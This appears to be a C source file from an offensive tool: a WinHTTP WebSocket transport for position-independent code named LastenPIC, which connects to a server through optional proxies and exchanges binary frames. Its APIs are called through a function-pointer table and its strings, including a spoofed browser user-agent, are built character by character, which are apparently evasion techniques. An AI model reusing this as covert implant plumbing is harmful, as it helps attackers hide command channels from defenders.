#include "WS.h"

DWORD initWS(LastenPIC* pLastenPIC, PWSTR proxy, PWSTR proxy_username, PWSTR proxy_password) {

	DWORD dwSuccess = FAIL;
	BOOL bStatus = FALSE;
  	WINHTTP_PROXY_INFO proxyInfo = { 0 };
    
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL, hWebSocket = NULL;
	wchar_t wGet[] = { 'G', 'E', 'T', 0x00 };
	wchar_t wUa[] = { 'M','o','z','i','l','l','a','/','5','.','0',' ','(','W','i','n','d','o','w','s',' ','N','T',' ','1','0','.','0',')',' ','A','p','p','l','e','W','e','b','K','i','t','/','5','3','7','.','3','6',' ','(','K','H','T','M','L',',',' ','l','i','k','e',' ','G','e','c','k','o',')',' ','C','h','r','o','m','e','/','4','2','.','0','.','2','3','1','1','.','1','3','5',' ','S','a','f','a','r','i','/','5','3','7','.','3','6',' ','E','d','g','e','/','1','2','.','1','0','1','3','6', 0x00};

	hSession = pLastenPIC->fPointers._WinHttpOpen(wUa, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
	if (hSession == NULL)
		goto exit;

	hConnect = pLastenPIC->fPointers._WinHttpConnect(hSession, pLastenPIC->wServerName, pLastenPIC->port, 0);
	if (hConnect == NULL)
		goto exit;

	hRequest = pLastenPIC->fPointers._WinHttpOpenRequest(hConnect, wGet, pLastenPIC->wPath, NULL, NULL, NULL, 0);
	if (hRequest == NULL)
		goto exit;

#ifndef __MINGW32__
#pragma prefast(suppress:6387, "WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET does not take any arguments.")
#endif
	bStatus = pLastenPIC->fPointers._WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0);
	if (bStatus == FALSE)
		goto exit;

  if(proxy) {

    proxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
    proxyInfo.lpszProxy = proxy;

    bStatus = pLastenPIC->fPointers._WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(WINHTTP_PROXY_INFO));
    if(bStatus == FALSE)
      goto exit;

  }

	if (proxy_username && proxy_password) {

		bStatus = pLastenPIC->fPointers._WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_USERNAME, proxy_username, pLastenPIC->fPointers._lstrlenW(proxy_username));
		if (bStatus == FALSE)
			goto exit;

		bStatus = pLastenPIC->fPointers._WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_PASSWORD, proxy_password, pLastenPIC->fPointers._lstrlenW(proxy_password));
		if (bStatus == FALSE)
			goto exit;

	}

	bStatus = pLastenPIC->fPointers._WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
	if (bStatus == FALSE)
		goto exit;

	bStatus = pLastenPIC->fPointers._WinHttpReceiveResponse(hRequest, 0);
	if (bStatus == FALSE)
		goto exit;

	hWebSocket = pLastenPIC->fPointers._WinHttpWebSocketCompleteUpgrade(hRequest, 0);
	if (hWebSocket == NULL)
		goto exit;

	pLastenPIC->hWebSocket = hWebSocket;
	dwSuccess = SUCCESS;

exit:

	if (hSession)
		pLastenPIC->fPointers._WinHttpCloseHandle(hSession);

	if (hConnect)
		pLastenPIC->fPointers._WinHttpCloseHandle(hConnect);

	if (hRequest)
		pLastenPIC->fPointers._WinHttpCloseHandle(hRequest);

	return dwSuccess;

}

#pragma GCC push_options
#pragma GCC optimize ("O0")
DWORD readLastenFrame(LastenPIC * pLastenPIC, LastenFrame* pLastenFrame, LPDWORD ptr_dwReadTotal) {

	DWORD dwSuccess = FAIL, dwRead = 0x00, dwReadTotal = 0x00;
	WINHTTP_WEB_SOCKET_BUFFER_TYPE bufferType = { 0x00 };
	DWORD dwLenRemaining = sizeof(LastenFrame);

	*ptr_dwReadTotal = 0x00;
	for (uint32_t i = 0; i < sizeof(LastenFrame); i++){
		*((uint8_t*)(pLastenFrame) + i) = 0x00;
	}

	do {

		if (dwLenRemaining == 0)
			goto exit;

		dwSuccess = pLastenPIC->fPointers._WinHttpWebSocketReceive(pLastenPIC->hWebSocket, (PVOID)((BYTE*)pLastenFrame + dwReadTotal), dwLenRemaining, &dwRead, &bufferType);
		if (dwSuccess != ERROR_SUCCESS) {
			dwSuccess = FAIL;
			goto exit;
		}

		dwReadTotal += dwRead;
		dwLenRemaining -= dwRead;

	} while (bufferType == WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE);

	*ptr_dwReadTotal = dwReadTotal;

	dwSuccess = SUCCESS;

exit:
	return dwSuccess;

}
#pragma GCC pop_options

DWORD sendLastenFrame(LastenPIC* pLastenPIC, LastenFrame* pLastenFrame) {

	DWORD dwSuccess = FAIL;
	SIZE_T sizeToSend = 0;

	sizeToSend = sizeof(pLastenFrame->session) + sizeof(pLastenFrame->command) + sizeof(pLastenFrame->message_len) + pLastenFrame->message_len;

	dwSuccess = pLastenPIC->fPointers._WinHttpWebSocketSend(pLastenPIC->hWebSocket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, pLastenFrame, (DWORD)sizeToSend);
	if (dwSuccess != ERROR_SUCCESS) 
		goto exit;
	

	dwSuccess = SUCCESS;

exit:
	return dwSuccess;

}

void wsClose(LastenPIC* pLastenPIC) {

	if(pLastenPIC->hWebSocket) {
		pLastenPIC->fPointers._WinHttpWebSocketShutdown(pLastenPIC->hWebSocket, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
		pLastenPIC->fPointers._WinHttpWebSocketClose(pLastenPIC->hWebSocket, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
	}

}
